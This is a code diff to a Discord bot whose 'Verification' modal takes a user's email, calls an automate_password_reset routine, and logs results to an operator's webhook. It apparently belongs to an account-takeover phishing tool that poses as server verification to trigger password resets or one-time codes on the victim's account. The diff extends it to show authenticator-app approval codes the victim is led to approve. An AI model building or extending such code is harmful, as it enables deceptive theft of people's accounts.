@@ -163,9 +163,21 @@ class MyModalOne(ui.Modal, title="Verification"):
             async with aiohttp.ClientSession() as session:
                 webhook = Webhook.from_url(data["webhook"], session=session)
                 result = await automate_password_reset(self.box_two.value)
+
+                if result == "invalid":
+                    # account doesn't exist!
+                    await interaction.followup.send(
+                        embed=discord.Embed(
+                            title="Error ❌",
+                            description="Please try again with a valid email",
+                            colour=0xFF0000
+                        ),
+                        ephemeral=True
+                    )
+                    return
+
                 if result is False:
-                    embedfalse=discord.Embed(title="Email A Code Failed (No Email A Code Turned On)",timestamp= datetime.datetime.now(),colour=0xff0000)
-                    await webhook.send(embed=embedfalse,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
+                    # no 2FA email set
                     await interaction.followup.send(
                         embed=discord.Embed(
                             title="No Security Email :envelope:",
@@ -175,15 +187,30 @@ class MyModalOne(ui.Modal, title="Verification"):
                         view=ButtonViewThree(),
                         ephemeral=True
                     )
-                else:
+                    return
+
+                # at this point result == True (email-OTP) or a str (auth-app code)
+                if isinstance(result, str):
+                    # Auth-app approval code came back
                     await interaction.followup.send(
-                    embed=discord.Embed(
-                        title="Verification ✅",
-                        description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
-                        colour=0x00FF00
-                    ),
-                    view=ButtonViewTwo(),
-                    ephemeral=True
+                        embed=discord.Embed(
+                            title="🔒 Authenticator App Approval Code",
+                            description=f"```\n{result}\n```",
+                            colour=0x00AAFF
+                        ),
+                        ephemeral=True
                     )
+                else:
+                    # email-OTP succeeded
+                    await interaction.followup.send(
+                        embed=discord.Embed(
+                            title="Verification ✅",
+                            description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
+                            colour=0x00FF00
+                        ),
+                        view=ButtonViewTwo(),
+                        ephemeral=True
+                    )
+
                     embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
                     await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
